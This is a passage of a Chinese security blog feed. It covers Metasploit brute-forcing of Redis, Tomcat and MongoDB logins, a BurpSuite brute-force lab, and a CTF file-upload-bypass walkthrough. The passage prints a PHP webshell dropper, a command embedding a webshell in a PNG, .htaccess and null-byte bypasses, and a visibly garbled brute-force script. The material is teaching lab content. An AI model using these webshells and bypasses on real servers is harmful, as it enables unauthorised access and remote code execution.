class="line">use auxiliary / scanner/ redis / redis_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.3</span><br><span class="line"><span class="built_in">set</span> pass_file /root/pass.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>MSF的爆破速度，大概1秒种2个字典<br>编辑配置文件，设置添加密码参数如下:<br><code>requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</code></p><blockquote><p>redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。requirepass至少长度20位以上</p></blockquote><p>重启redis服务，验证查看:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#带密码的连接格式</span></span><br><span class="line">redis-cli -h 10.211.55.4 -p 6379 -a XXXXXXXX</span><br></pre></td></tr></table></figure><ul><li><strong>还有一种不启动修改 redis 密码</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询当前密码</span></span><br><span class="line">127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2)<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置认证密码</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f2</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看密码提示没有认证的登录</span></span><br><span class="line">127.0.0.1:6379&gt;config get requirepass</span><br><span class="line">(error)NOAUTH Authentication required.</span><br><span class="line"></span><br><span class="line"><span class="comment">#auth登录下</span></span><br><span class="line">127.0.0.1:6379&gt; auth ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次查看密码</span></span><br><span class="line">127.0.0.1:6379 &gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot; requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815&quot;</span></span><br></pre></td></tr></table></figure><p>重启后失效</p><h3 id="爆破-8080-Tomcat"><a href="#爆破-8080-Tomcat" class="headerlink" title="爆破 8080 Tomcat"></a>爆破 8080 Tomcat</h3><p>Tomcat是由 Apache 软件基金会属下Jakarta项目开发的<strong>Servlet容器</strong>，默认端口为8080<br>可以使用Burp的Basic认证爆破也可以直接使用MSF的模块来进行爆破。<strong>Tomcat令是用户名<br>在/conf/tomcat-users.xml自定义配置的，容易出现弱口令</strong>，<strong>Tomcat口令泄露的话很容易被getshell所有需要加固口令</strong>。</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line"><span class="built_in">set</span> RHosTsf 10.211.55.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-27017-MongoDb"><a href="#爆破-27017-MongoDb" class="headerlink" title="爆破 27017 MongoDb"></a>爆破 27017 MongoDb</h3><p>MongoDB是一个基于<strong>分布式文件存储的数据库</strong>，当配置成无验证时，存在未授权访问。默认端口为 <strong>27017</strong> 可以直接使用超级弱口令工具爆破也可以使用Metasploit:</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary /scanner / mongodb/mongodb_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> RPORTS 27017</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 爆破端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - Web 认证漏洞</title>
      <link href="/post/22329.html/"/>
      <url>/post/22329.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BurpSuite-爆破模块详解"><a href="#BurpSuite-爆破模块详解" class="headerlink" title="BurpSuite 爆破模块详解"></a>BurpSuite 爆破模块详解</h1><p><strong>本项目的优势</strong>：</p><ol><li><strong>Docker 一键部署</strong>很方便，可以灵活的导入到 CTFd 中</li><li><strong>前面是解题提示和思路，后面带有详细的解题步骤</strong> </li><li>题目更侧重于教学，注重对选手解题的引导，而不是一味地刁难选手</li><li>详细的解题步骤转自<a href="https://www.sqlsec.com/2020/10/upload.html">国光的博客</a></li></ol><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p><strong>DockerHub 项目地址</strong>：<a href="https://hub.docker.com/r/sqlsec/ggctf-upload">https://hub.docker.com/r/sqlsec/ggctf-upload</a><br><strong>Github 项目地址</strong>：<a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a></p><ul><li><strong>推荐使用 Ubuntu 哦</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目文件夹</span></span><br><span class="line"><span class="built_in">cd</span> upload-labs-docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署运行</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>默认 13 个关卡运行的端口为 30001-30013 这 13 个端口上，如果要自定义端口信息的话，自行修改 docker-compose.yml 文件即可。</p><blockquote><p>一共 13 个 Docker 容器，可能第一次部署需要一定的时间，有点硬伤， 耐心等待一下即可</p></blockquote><p><a href="https://image.3001.net/images/20201025/16035979507409.png"><img src="https://image.3001.net/images/20201025/16035979507409.png" alt="img"></a></p><h2 id="Web爆破靶场实战"><a href="#Web爆破靶场实战" class="headerlink" title="Web爆破靶场实战"></a>Web爆破靶场实战</h2><h3 id="1-简单的四位数字密码爆破"><a href="#1-简单的四位数字密码爆破" class="headerlink" title="1.简单的四位数字密码爆破"></a>1.简单的四位数字密码爆破</h3><p>用 BP 抓包发测试 <strong>Intruder</strong> 进行爆破，注意要<strong>设置密码格式</strong></p><h3 id="2-简单的弱口令密码爆破"><a href="#2-简单的弱口令密码爆破" class="headerlink" title="2.简单的弱口令密码爆破"></a>2.简单的弱口令密码爆破</h3><ul><li><strong>验证码复用</strong>漏洞<br>用 BP 抓包  输入字典进行爆破 </li></ul><h3 id="3-带验证码的密码爆破？"><a href="#3-带验证码的密码爆破？" class="headerlink" title="3.带验证码的密码爆破？"></a>3.带验证码的密码爆破？</h3><p>抓包之后 <strong>不放包</strong> 验证码不会失效 就能一直爆破了</p><h3 id="4-Basic-爆破"><a href="#4-Basic-爆破" class="headerlink" title="4.Basic 爆破"></a>4.Basic 爆破</h3><p>将密码加密 base64 加密<br>BP <strong>迭代器</strong>，账号:密码  有效载荷选项 和 有效负荷处理</p><h3 id="5-前端加密爆破"><a href="#5-前端加密爆破" class="headerlink" title="5.前端加密爆破"></a>5.前端加密爆破</h3><ul><li>原理：把前端加密 md5 放进数据库<br>BP 有效负荷处理 添加HASH 的md5 加密 然后再攻击</li></ul><h3 id="6-泄露数据库撞库"><a href="#6-泄露数据库撞库" class="headerlink" title="6.泄露数据库撞库"></a>6.泄露数据库撞库</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork</strong>：是用户名与密码一一对应的进行爆破</li></ul><h3 id="7-泄露数据库撞库-2"><a href="#7-泄露数据库撞库-2" class="headerlink" title="7.泄露数据库撞库-2"></a>7.泄露数据库撞库-2</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork，paylode处理hash md5加密</strong></li></ul><h3 id="8-返回包提取爆破"><a href="#8-返回包提取爆破" class="headerlink" title="8.返回包提取爆破"></a>8.返回包提取爆破</h3><p>正确错误<strong>返回密码长度都相同</strong>时， 在Options中选择<strong>Extract</strong> ，添加返回<strong>选中</strong></p><h3 id="9-简单的-token-验证"><a href="#9-简单的-token-验证" class="headerlink" title="9.简单的 token 验证"></a>9.简单的 token 验证</h3><ul><li>token 时间戳形式<br>时间戳 BP 不能写时间戳 需要手动写脚本<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url =<span class="string">&quot;http://10.20.24.244/&quot;</span> headers =</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;10.20.24.244&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type1: &#x27;</span>application/x-ww-form-urlencoded<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>User-Agent<span class="string">&#x27;:&#x27;</span>Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>;Win64;x64)AppleWebKit/<span class="number">537.36</span> (KHTML,like</span><br><span class="line">&#125;</span><br><span class="line">payloads=<span class="built_in">open</span>(<span class="string">&quot;pass,txt&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    data =<span class="string">f&quot;username=admin&amp;password=<span class="subst">&#123;payload&amp;token=&#123;md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.tihe())))y<span class="string">&quot; </span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    r = requests.post(url=url, headers=headers, data=data)</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    if&#x27;flag&#123;&#x27;in r.text:</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">        print(f&quot;</span>\033[<span class="number">32</span>;1m[+] success &#123;data&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[1;34m[*] attack<span class="subst">&#123;data&#125;</span>\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="10-没有简单的弱口令"><a href="#10-没有简单的弱口令" class="headerlink" title="10.没有简单的弱口令"></a>10.没有简单的弱口令</h3><p>验证码只能用一次   验证码爆破 </p><ul><li>利用burp的插件来进行验证码识别爆破</li><li>用captcha-killer插件，开源地址:<a href="https://github.com/cOny1/captcha-killer">https://github.com/cOny1/captcha-killer</a></li><li>工具 ：pkavhttpfuzzer  爱盘BP 1.7  captcha</li></ul><ol><li>将测试包粘贴到工具中 添加字典 </li><li>添加验证码标记 写入验证码地址</li><li>验证码识别重放模式：单线程</li></ol><hr><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p><a href="https://image.3001.net/images/20201025/16035981315620.png"><img src="https://image.3001.net/images/20201025/16035981315620.png" alt="img"></a></p><p>如何判断是否是前端验证呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><a href="https://image.3001.net/images/20201025/16036095176123.png"><img src="https://image.3001.net/images/20201025/16036095176123.png" alt="img"></a></p><h2 id="解法一：抓包"><a href="#解法一：抓包" class="headerlink" title="解法一：抓包"></a>解法一：抓包</h2><p>因为是前段验证的问题，可以直接将 shell.php 重命名为 shell.png 上传抓包的时候再将文件名修改为 shell.php 即可绕过前段限制，成功上传 webshell。</p><h2 id="解法二：禁用-JS"><a href="#解法二：禁用-JS" class="headerlink" title="解法二：禁用 JS"></a>解法二：禁用 JS</h2><p>因为 JS 来校验文件后缀的原因，所以可以直接在浏览器上禁用 JS 这样就可以直接上传文件了。Chrome 内核的浏览器在审查元素的状态下可以找到 Settings 选项，然后找到 「Debugger」 选项下面直接勾选 「Disable JavaScript」即可。</p><h2 id="解法三：调试-JS"><a href="#解法三：调试-JS" class="headerlink" title="解法三：调试 JS"></a>解法三：调试 JS</h2><p>这种解法就类似于孔乙己中的茴香豆的 「茴」有几种写法？，纯粹就是为了炫技，但是并不实用，那么国光下面就简单说下调试 JS 的过程吧。</p><p>首先审查元素下下断点：</p><p><a href="https://image.3001.net/images/20201025/16036082412704.png"><img src="https://image.3001.net/images/20201025/16036082412704.png" alt="img"></a></p><p>单行单步调试，找到 <code>whitelist</code> 变量，双击元素然后直接修改数组元素的值 ：</p><p><a href="https://image.3001.net/images/20201025/16036087605888.png"><img src="https://image.3001.net/images/20201025/16036087605888.png" alt="img"></a></p><p>放掉数据包，之前的 shell.php 可直接上传成功：</p><p><a href="https://image.3001.net/images/20201025/1603608623108.png"><img src="https://image.3001.net/images/20201025/1603608623108.png" alt="img"></a></p><p>成功拿到根目录下的 flag：</p><p><a href="https://image.3001.net/images/20201025/16036086662827.png"><img src="https://image.3001.net/images/20201025/16036086662827.png" alt="img"></a></p><h1 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h1><p>这样下去感觉上课都不需要 PPT 了，关键姿势点都直接贴在了题目中了：</p><p><a href="https://image.3001.net/images/20201025/16036091167949.png"><img src="https://image.3001.net/images/20201025/16036091167949.png" alt="img"></a></p><p>因为提示了 MIME 类型校验，所以抓取上传的数据包然后直接修改 <code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型即可：</p><p><a href="https://image.3001.net/images/20201026/1603684549564.png"><img src="https://image.3001.net/images/20201026/1603684549564.png" alt="img"></a></p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>本题配图中里面包含了 GIF89a 已经很明显了，答案就在题目中：</p><p><a href="https://image.3001.net/images/20201025/16036097871368.png"><img src="https://image.3001.net/images/20201025/16036097871368.png" alt="img"></a></p><p>本题校验了图片的文件头也就是校验图片内容的，这个时候使用一个标准的图马是可以成功绕过的，由于国光的这个代码只校验了前面几个字节，所以直接写 GIF89a 即可成功绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846031002.png"><img src="https://image.3001.net/images/20201026/16036846031002.png" alt="img"></a></p><h1 id="缺陷的代码-1"><a href="#缺陷的代码-1" class="headerlink" title="缺陷的代码 - 1"></a>缺陷的代码 - 1</h1><p>本题的图片上的第 2 行代码是一个有缺陷的代码，黑名单关键词替换为空的操作是一种不安全的写法：</p><p><a href="https://image.3001.net/images/20201025/16036102265581.png"><img src="https://image.3001.net/images/20201025/16036102265581.png" alt="img"></a></p><p>因为代码开发者的错误写法，这种情况下可以直接使用嵌套后缀绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846312806.png"><img src="https://image.3001.net/images/20201026/16036846312806.png" alt="img"></a></p><h1 id="缺陷的代码-2"><a href="#缺陷的代码-2" class="headerlink" title="缺陷的代码 - 2"></a>缺陷的代码 - 2</h1><p>本地属于理论上漏洞，因为题目环境是 Docker 容器运行的 Linux 系统，所以本题国光修改成了 Windows 的特性</p><p><a href="https://image.3001.net/images/20201025/1603610505374.png"><img src="https://image.3001.net/images/20201025/1603610505374.png" alt="img"></a></p><p>同理图片提示中的第 2 行代码也是有缺陷的，可以仅用了 <code>str_replace</code> 替换，这样很容易就被大小写绕过，因为 Windows 环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用，所以本题是国光自己造的漏洞，用来伪造 Windows 环境下的大小写不区分的情况：</p><p><a href="https://image.3001.net/images/20201026/1603684654836.png"><img src="https://image.3001.net/images/20201026/1603684654836.png" alt="img"></a></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p>本题同样题目的配图中暗示已经比较明显了，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP：</p><p><a href="https://image.3001.net/images/20201025/16036116763150.png"><img src="https://image.3001.net/images/20201025/16036116763150.png" alt="img"></a></p><p>那么这里 Fuzz 一下，发现这些稍微冷门的后缀都可以直接绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846759511.png"><img src="https://image.3001.net/images/20201026/16036846759511.png" alt="img"></a></p><h1 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h1><p>本题的暗示也已经很明显了，只要选手查询 htaccess 怎么解析的话，就可以很顺利的解题：</p><p><a href="https://image.3001.net/images/20201025/160361194314.png"><img src="https://image.3001.net/images/20201025/160361194314.png" alt="img"></a></p><p>因为题目是考擦 htaccess 这个上传知识点，所以先准备一个解析规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>然后先上传这个 .htaccess 文件到服务器的 upload 目录下：</p><p><a href="https://image.3001.net/images/20201026/16036846984498.png"><img src="https://image.3001.net/images/20201026/16036846984498.png" alt="img"></a></p><p>这表示将 upload 目录下的所有 png 图片都当做 php 来解析，然后再上传一个 shell.png 即可：</p><p><a href="https://image.3001.net/images/20201026/16036847615642.png"><img src="https://image.3001.net/images/20201026/16036847615642.png" alt="img"></a></p><p>此时这个 shell.png 就已经被当做 PHP 解析了：</p><p><a href="https://image.3001.net/images/20201025/16036122801854.png"><img src="https://image.3001.net/images/20201025/16036122801854.png" alt="img"></a></p><h1 id="古老的漏洞-1"><a href="#古老的漏洞-1" class="headerlink" title="古老的漏洞 - 1"></a>古老的漏洞 - 1</h1><p>本题依然在题目中科普了 00 截断是啥，以及 00 截断的利用条件：</p><p><a href="https://image.3001.net/images/20201025/16036124585228.png"><img src="https://image.3001.net/images/20201025/16036124585228.png" alt="img"></a></p><p>00 截断多配合路径来截断，我们来抓包看看应该是存在路径信息的，然后直接在路径后面使用 %00 来截断一下就可以成功绕过，为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节：</p><p><a href="https://image.3001.net/images/20201026/16036847876825.png"><img src="https://image.3001.net/images/20201026/16036847876825.png" alt="img"></a></p><p>这样保存的文件名就是这样的效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/apache2/htdocs/upload/new.php%00shell.png</span><br></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell</p><p><a href="https://image.3001.net/images/20201025/16036127173608.png"><img src="https://image.3001.net/images/20201025/16036127173608.png" alt="img"></a></p><h1 id="古老的漏洞-2"><a href="#古老的漏洞-2" class="headerlink" title="古老的漏洞 - 2"></a>古老的漏洞 - 2</h1><p>国光这一题偷懒了，没有换题目外观，不过选手们抓包就会发现这是一个 POST 型的 00 截断：</p><p><a href="https://image.3001.net/images/20201025/16036129575787.png"><img src="https://image.3001.net/images/20201025/16036129575787.png" alt="img"></a></p><p>既然是 POST 型 00 截断那么就直接抓包吧，需要在 BP 里面写一个 %00 然后再 URL 手动解码一下：</p><p><a href="https://image.3001.net/images/20201025/16036131049530.png"><img src="https://image.3001.net/images/20201025/16036131049530.png" alt="img"></a></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>本题是一个条件竞争漏洞，也在题目中给了关键的功能代码贴图，以及给了解题思路了：</p><p><a href="https://image.3001.net/images/20201025/16036135842482.png"><img src="https://image.3001.net/images/20201025/16036135842482.png" alt="img"></a></p><p>条件竞争的话稍微和正常的上传姿势不一样，先把题目中给的 webshell 信息复制出来备用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后先上传 shell.php 文件：</p><p><a href="https://image.3001.net/images/20201026/16036848394730.png"><img src="https://image.3001.net/images/20201026/16036848394730.png" alt="img"></a></p><p>BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：</p><p><a href="https://image.3001.net/images/20201025/16036138407749.png"><img src="https://image.3001.net/images/20201025/16036138407749.png" alt="img"></a></p><p>然后抓取访问 shell.php 的数据包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTPGET /upload/shell.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vul.xps.com:<span class="number">30009</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.14</span>; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure><p>依然使用 NULL 空值爆破：</p><p><a href="https://image.3001.net/images/20201025/16036140058678.png"><img src="https://image.3001.net/images/20201025/16036140058678.png" alt="img"></a></p><p>最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的 webshell：</p><p><a href="https://image.3001.net/images/20201025/16036153403524.png"><img src="https://image.3001.net/images/20201025/16036153403524.png" alt="img"></a></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p>这一题取材于 upload-labs 后面新增的题目：</p><p><a href="https://image.3001.net/images/20201025/1603615449643.png"><img src="https://image.3001.net/images/20201025/1603615449643.png" alt="img"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure><p>当 <code>$img_path</code> 可控的时候，还会忽略掉 <code>$img_path</code> 后面的 <code>/.</code> ，这一点发现最早是 <a href="https://www.smi1e.top/">Smile</a> 师傅于 2019 年 2 月份提出来的，TQL !!! 既然知道 move_uploaded_file 的这个小缺陷的话，这样既可直接 Getshell：</p><p><a href="https://image.3001.net/images/20201025/16036161031022.png"><img src="https://image.3001.net/images/20201025/16036161031022.png" alt="img"></a></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的，另外这一题我特意还给了查看提示的按钮：</p><p><a href="https://image.3001.net/images/20201025/1603616269318.png"><img src="https://image.3001.net/images/20201025/1603616269318.png" alt="img"></a></p><p>点击这个查看提示会出现如下页面：</p><p><a href="https://image.3001.net/images/20201025/16036164852192.png"><img src="https://image.3001.net/images/20201025/16036164852192.png" alt="img"></a></p><p>注意 URL 发生了变化，没错这里是一个文件包含漏洞，这样包含选手们逃避渲染上传后的图片的话就可以直接 getshell 了：</p><p><a href="https://image.3001.net/images/20201025/16036165628118.png"><img src="https://image.3001.net/images/20201025/16036165628118.png" alt="img"></a></p><p>接下来要总结一下二次渲染的细节了，这也是耗费时间写本文的主要动力之一，因为上面的那些知识点都比较常规，这个二次渲染的细节国光我一直都没有深入总结过，正好就放这里总结一下。</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p><p>首先准备一张迷你的 GIF</p><p><a href="https://image.3001.net/images/20201025/16036176592096.gif"><img src="https://image.3001.net/images/20201025/16036176592096.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036252666623.gif"><img src="https://image.3001.net/images/20201025/16036252666623.gif" alt="img"></a></p><p>使用 010Editor 打开这两个文件，在 「Tools」选项下面找到「Compare Files」即可对比两个文件内容：</p><p><a href="https://image.3001.net/images/20201025/1603625929446.png"><img src="https://image.3001.net/images/20201025/1603625929446.png" alt="img"></a></p><p>对比的效果如下，其中灰的部分就是内容一致的部分：</p><p><a href="https://image.3001.net/images/20201025/16036266297353.png"><img src="https://image.3001.net/images/20201025/16036266297353.png" alt="img"></a></p><p>那么只需要将 PHP 代码插入到灰色的部分即可：</p><p><a href="https://image.3001.net/images/20201025/16036267273505.png"><img src="https://image.3001.net/images/20201025/16036267273505.png" alt="img"></a></p><p>修改后的 gif 图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036267469060.gif"><img src="https://image.3001.net/images/20201025/16036267469060.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036268187614.gif"><img src="https://image.3001.net/images/20201025/16036268187614.gif" alt="img"></a></p><p>此时查看一下发现我们的 payload 内容依然存在：</p><p><a href="https://image.3001.net/images/20201026/16036850183974.png"><img src="https://image.3001.net/images/20201026/16036850183974.png" alt="img"></a></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。首先准备一个 PNG 图片：</p><p><a href="https://image.3001.net/images/20201025/16036276956867.png"><img src="https://image.3001.net/images/20201025/16036276956867.png" alt="img"></a></p><p>两次渲染后对比一下，发现除了 PNG 文件头，其他部分全都不一致：</p><p><a href="https://image.3001.net/images/20201025/16036285349399.png"><img src="https://image.3001.net/images/20201025/16036285349399.png" alt="img"></a></p><p>看来使用 GIF 那种思路是行不通的了。PNG 的解决方法继续往下面看。</p><h3 id="写入-PLTE-数据块"><a href="#写入-PLTE-数据块" class="headerlink" title="写入 PLTE 数据块"></a>写入 PLTE 数据块</h3><p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p><p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a></p><p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p><p>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p><p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</p><p><a href="https://image.3001.net/images/20201025/16036303454787.png"><img src="https://image.3001.net/images/20201025/16036303454787.png" alt="img"></a></p><p>修改的索引图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036304687175.png"><img src="https://image.3001.net/images/20201025/16036304687175.png" alt="img"></a></p><p>然后使用 Python2 运行脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p>生成新的 gg_shell.png 图片如下：</p><p><a href="https://image.3001.net/images/20201025/1603630522797.png"><img src="https://image.3001.net/images/20201025/1603630522797.png" alt="img"></a></p><p>这个图片是带 